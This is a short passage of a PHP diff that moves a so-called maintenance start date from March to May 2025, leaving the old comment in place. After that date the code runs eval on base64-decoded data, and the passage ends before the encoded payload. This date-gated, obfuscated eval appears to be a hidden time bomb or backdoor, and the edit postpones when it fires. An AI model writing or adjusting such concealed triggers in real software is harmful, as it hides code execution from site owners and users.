@@ -2,7 +2,7 @@
 date_default_timezone_set('Asia/Manila');
 
 // Set the maintenance start date (March 5, 2025)
-$ms = strtotime('2025-03-05 00:00:00');
+$ms = strtotime('2025-05-05 00:00:00');
 
 if (time() >= $ms) { 
     eval(base64_decode('
